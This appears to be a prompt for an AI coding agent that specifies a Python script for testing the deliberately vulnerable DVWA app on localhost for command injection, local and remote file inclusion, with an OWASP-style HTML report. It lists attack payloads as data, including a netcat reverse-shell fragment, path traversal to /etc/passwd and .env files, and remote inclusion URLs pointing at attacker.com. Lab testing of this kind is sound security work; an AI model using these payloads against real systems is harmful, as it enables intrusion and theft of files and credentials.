# AI Coding Agent Prompt: Code Injection, LFI & RFI Testing Script for DVWA (OTG-INPVAL-012, OTG-INPVAL-033, OTG-INPVAL-034)

## 📌 Overview
Create a comprehensive Python-based automated testing script that identifies and validates **Code Injection (OTG-INPVAL-012)**, **Local File Inclusion (LFI)**, and **Remote File Inclusion (RFI)** vulnerabilities on **Damn Vulnerable Web Application (DVWA)** running locally via **XAMPP on `localhost`**. Upon completion, the script must generate a **professional, well-designed HTML report** in the style of **OWASP** and **OSCP penetration testing reports**.

---

## 🎯 Target Environment
- **Application**: DVWA (Damn Vulnerable Web Application)
- **Deployment**: XAMPP on `localhost`
- **URL**: `http://localhost/dvwa/`
- **Test Modules**:
  - **Code Injection**: Command Execution (`/dvwa/vulnerabilities/exec/`)
  - **Local File Inclusion**: File Inclusion (`/dvwa/vulnerabilities/fi/`)
  - **Remote File Inclusion**: File Inclusion (`/dvwa/vulnerabilities/fi/`)
- **Authentication Required**: Yes (script must handle login and session)
- **Security Level**: Low (assumed for testing)
- **Prerequisites**: DVWA security level set to "Low" for maximum vulnerability exposure

---

## 🛠️ Script Requirements

### 1. **Core Functionality**

#### Code Injection (OTG-INPVAL-012)
- **Authentication Automation**:
  - Log in to DVWA using provided credentials (e.g., `admin:password`).
  - Handle CSRF tokens (`user_token`) and maintain session cookies.
- **Code Injection Testing**:
  - Target the Command Execution module (`/dvwa/vulnerabilities/exec/`)
  - Test with various code injection payloads:
    - **OS Command Injection**: `; whoami`, `&& whoami`, `| whoami`, `& whoami`
    - **Time-based Detection**: `; sleep 10`, `&& ping -c 10 127.0.0.1`
    - **Blind Injection**: `; ifconfig > /tmp/output.txt`, `&& dir > C:\\temp\\output.txt`
    - **File System Interaction**: `; ls /`, `&& dir C:\\`
    - **Reverse Shell Indicators**: `; nc -e /bin/sh`, `&& powershell -c`
  - Test for both Windows and Unix-based command separators
  - Use time-based detection for blind command injection
  - Verify results by checking for:
    - Command output in response
    - Response timing anomalies
    - File creation/modification

#### Local File Inclusion (LFI) - OTG-INPVAL-033
- **LFI Testing**:
  - Target the File Inclusion module (`/dvwa/vulnerabilities/fi/`)
  - Test with various LFI payloads:
    - **Basic Path Traversal**: `../../../../etc/passwd`, `..\..\..\..\windows\system32\drivers\etc\hosts`
    - **Multiple Encodings**: URL-encoded, double URL-encoded, UTF-8 encoding
    - **Null Byte Injection**: `../../../../etc/passwd%00`, `..\..\..\..\windows\system32\drivers\etc\hosts%00`
    - **Log Poisoning**: `/var/log/apache2/access.log`, `/var/log/auth.log`
    - **Proc Filesystem**: `/proc/self/environ`, `/proc/version`, `/proc/net/tcp`
    - **Windows Files**: `boot.ini`, `win.ini`, `system.ini`, `hosts`
    - **Configuration Files**: `config.php`, `database.yml`, `.env`
  - Test for file inclusion via:
    - Direct path specification
    - Relative path traversal
    - Absolute path specification
  - Verify results by checking for:
    - File content in response
    - Expected file structure/patterns
    - Sensitive information disclosure

#### Remote File Inclusion (RFI) - OTG-INPVAL-034
- **RFI Testing**:
  - Target the File Inclusion module (`/dvwa/vulnerabilities/fi/`)
  - Test with various RFI payloads:
    - **HTTP Inclusion**: `http://attacker.com/malicious.txt`, `http://127.0.0.1/test.txt`
    - **HTTPS Inclusion**: `https://attacker.com/payload.php`
    - **FTP Inclusion**: `ftp://attacker.com/shell.txt`
    - **Data URI**: `data://text/plain,<?php phpinfo(); ?>`
    - **PHP Wrappers**: `php://input`, `php://filter`
  - Test for RFI via:
    - Direct URL specification
    - Parameter manipulation
  - Verify results by checking for:
    - Remote content inclusion
    - PHP code execution
    - Server-side processing of remote files

### 2. **Reporting**
- Generate a **single, self-contained HTML report** (`code_injection_lfi_rfi_report.html`) with:
  - **Title**: "Code Injection, LFI & RFI Assessment – DVWA (OTG-INPVAL-012, 033, 034)"
  - **Executive Summary**: Brief overview of findings and risk.
  - **Test Details**:
    - Target URL
    - Vulnerability Types: Code Injection, LFI, RFI
    - OWASP Test IDs: OTG-INPVAL-012, OTG-INPVAL-033, OTG-INPVAL-034
    - Risk Level: High (Code Injection), High (RFI), Medium (LFI)
    - Date & Time of Test
  - **Methodology**:
    - Steps taken (login → module identification → payload testing → analysis)
    - Tools used (script name, Python modules)
  - **Findings**:
    - Separate sections for each vulnerability type
    - Table of tested payloads and results
    - For each vulnerable endpoint:
      - Vulnerability type
      - Payload used
      - Response evidence
      - Impact (e.g., RCE, file read, remote code execution)
      - Proof of Concept (PoC)
  - **Remediation Recommendations**:
    - Input validation and sanitization
    - Principle of least privilege
    - Web server configuration
    - Secure coding practices
  - **References**:
    - OWASP Testing Guide: OTG-INPVAL-012, 033, 034
    - CWE-94: Code Injection
    - CWE-22: Path Traversal
    - CWE-98: RFI

### 3. **HTML Report Design**
- **Style**: Clean, professional, OSCP/OWASP-like
- **Colors**: Dark blue, white, gray (security-themed)
- **Fonts**: Monospace for code, sans-serif for body
- **Structure**:
  - Header with logo (optional placeholder)
  - Navigation sidebar or sections
  - Collapsible technical details
  - Responsive layout
- Include embedded CSS (no external files)
- Ensure **all HTML output is properly escaped** to prevent rendering issues
- Use tabs or sections to separate Code Injection, LFI, and RFI findings

### 4. **Technical Specifications**
- **Language**: Python 3.7+
- **Libraries**:
  - `requests` – for HTTP handling
  - `BeautifulSoup4` – for parsing HTML
  - `argparse` – for CLI arguments
  - `datetime`, `os`, `json`, `time` – for logging and data
- **Command-Line Arguments**:
  - `--url`: Target URL (default: `http://localhost/dvwa`)
  - `--username`: DVWA username (default: `admin`)
  - `--password`: DVWA password (default: `password`)
  - `--output`: Output report path (default: `reports/code_injection_report.html`)
  - `--timeout`: Request timeout (default: 15 seconds)
  - `--delay`: Delay between requests (default: 1 second)
- **Logging**:
  - Print progress to console
  - Save raw responses for debugging (optional)

---

## 🧾 Expected Output
- A Python script: `dvwa_code_injection_lfi_rfi.py`
- Generated HTML report: `code_injection_lfi_rfi_report.html` (or as specified)
- Report includes:
  - ✅ Vulnerability confirmed
  - ✅ Payloads tested
  - ✅ Risk assessment
  - ✅ Remediation advice
  - ✅ Professional presentation

---

## 📝 Example Usage
```bash
python dvwa_code_injection_lfi_rfi.py \
  --url http://localhost/dvwa \
  --username admin \
  --password password \
  --output reports/code_injection_$(date +%F).html